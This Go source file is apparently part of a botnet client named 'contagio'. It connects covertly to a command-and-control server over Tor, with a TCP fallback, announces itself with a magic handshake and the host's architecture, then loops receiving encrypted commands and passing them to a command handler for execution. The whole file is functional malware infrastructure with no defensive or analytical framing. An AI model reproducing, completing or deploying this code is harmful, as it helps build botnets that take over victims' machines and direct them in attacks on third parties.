package main

import (
	"bytes"
	"contagio/bot/config"
	"contagio/bot/methods"
	"fmt"
	"net"
	"time"
)

func MainConnect() {

	if config.DEBUG {
		fmt.Println("[main] Сonnecting to the bot server...")
	}

	connection, err := Connect()
	if err != nil || connection == nil {
		time.Sleep(1 * time.Second)
		return
	}

	if config.DEBUG {
		fmt.Println("[main] Connected to the bot server!")
	}
	for {

		command := make([]byte, 2000)

		n, err := connection.Read(command)
		if err != nil {
			return
		}

		if len(command[:n]) < 5 {
			continue
		}

		if bytes.HasPrefix(command, []byte{0, 0, 0, 0, 0, 0, 0, 0, 0, 0}) { // null command
			continue
		}

		if !bytes.HasPrefix(command, []byte{255, 255, 10, 29, 49, 19, 10, 12, 44, 202}) {
			continue
		}

		cmd := Decrypt(command[:n])

		if cmd == "" { // error
			if config.DEBUG {
				fmt.Println("Decrypt error")
			}
			continue
		}

		CommandHandler(cmd)
	}

}

func Connect() (connection net.Conn, err error) {
	defer methods.Catch()

	if config.TOR_ENABLED {
		connection, err = ConnectViaTor()
		if err != nil {
			if !config.DISABLE_REAL_BOT_SERVER {
				connection, err = ConnectViaTcp()
				if err != nil {
					return nil, err
				}
			} else {
				return nil, fmt.Errorf("connection err")
			}
		}
	} else {
		if !config.DISABLE_REAL_BOT_SERVER {
			connection, err = ConnectViaTcp()
			if err != nil {
				return nil, err
			}
		}
	}

	if connection == nil {
		return nil, fmt.Errorf("connection err")
	}

	connection.Write([]byte{0, 0, 0, 30, 59, 10, 33, 10, 1, 1, 1, 5, 0, 0, 0, 0})
	connection.Write([]byte(Bot.Arch))

	return connection, nil
}

func ConnectViaTcp() (net.Conn, error) {
	defer methods.Catch()

	connection, err := net.Dial("tcp", config.BOT_SERVER+":"+config.BOT_PORT)

	if err != nil {
		if config.DEBUG {
			fmt.Println("[tcp] Can't connect to the bot server")
		}
		time.Sleep(1 * time.Second)
		return nil, err
	}

	return connection, nil
}
